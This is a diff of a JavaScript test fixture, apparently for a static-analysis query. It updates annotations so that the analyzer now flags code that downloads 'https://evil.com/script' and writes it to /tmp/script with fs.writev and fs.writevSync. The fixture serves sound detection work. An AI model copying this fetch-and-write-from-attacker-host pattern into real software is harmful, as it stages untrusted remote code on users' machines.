@@ -9,13 +9,13 @@ https.get('https://evil.com/script', res => {
 
 
 https.get('https://evil.com/script', res => {
-  res.on("data", d => { // $ MISSING: Source
+  res.on("data", d => { // $ Source
     fs.open("/tmp/script", 'r', (err, fd) => {
-      fs.writev(fd, [d], (err, bytesWritten) => { // $ MISSING: Alert
+      fs.writev(fd, [d], (err, bytesWritten) => { // $ Alert
         console.log(`Wrote ${bytesWritten} bytes`);
       });
 
-      const bytesWritten = fs.writevSync(fd, [d]); // $ MISSING: Alert
+      const bytesWritten = fs.writevSync(fd, [d]); // $ Alert
     });
   });
 });
